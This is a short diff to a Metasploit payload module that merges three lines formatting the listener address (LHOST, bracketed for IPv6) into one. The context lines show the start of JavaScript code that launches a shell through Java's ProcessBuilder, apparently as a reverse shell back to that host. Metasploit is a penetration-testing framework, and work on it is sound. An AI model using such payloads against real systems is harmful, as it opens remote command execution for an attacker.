@@ -45,9 +45,7 @@ module MetasploitModule
   end
 
   def command_string
-    lhost = datastore['LHOST']
-    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-
+    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
     jcode = %{
       var ProcessBuilder=Java.type("java.lang.ProcessBuilder");
       var p=new ProcessBuilder("#{datastore['SHELL']}").redirectErrorStream(true).start();
